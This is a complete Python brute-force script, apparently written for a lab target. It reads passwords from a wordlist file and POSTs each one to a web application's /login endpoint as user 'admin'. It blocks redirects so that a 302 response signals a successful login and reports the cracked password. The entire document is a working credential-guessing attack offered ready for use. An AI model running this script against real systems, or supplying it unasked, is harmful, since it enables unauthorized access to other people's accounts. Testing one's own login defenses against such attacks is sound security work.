#!/usr/bin/env python3

import sys
import urllib.parse
import urllib.request
import urllib.error

class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

if len(sys.argv) != 2:
    print("Usage:")
    print("  python3 bf-attack.py http://TARGET:18080")
    sys.exit(1)

BASE_URL = sys.argv[1].rstrip("/")
TARGET = BASE_URL + "/login"
USERNAME = "admin"

opener = urllib.request.build_opener(NoRedirectHandler)

with open("password.txt", "r") as f:
    passwords = [line.strip() for line in f if line.strip()]

print(f"[*] Target : {TARGET}")
print(f"[*] User   : {USERNAME}")
print()

for password in passwords:
    print(f"[!] Testing: {password}")

    data = urllib.parse.urlencode({
        "username": USERNAME,
        "password": password
    }).encode("utf-8")

    req = urllib.request.Request(
        TARGET,
        data=data,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"}
    )

    try:
        opener.open(req, timeout=5)

    except urllib.error.HTTPError as e:
        if e.code == 302:
            print()
            print(f"[+] Password Found : {password}")
            sys.exit(0)

    except Exception as e:
        print(f"[-] Error : {e}")

print()
print("[-] Password not found")
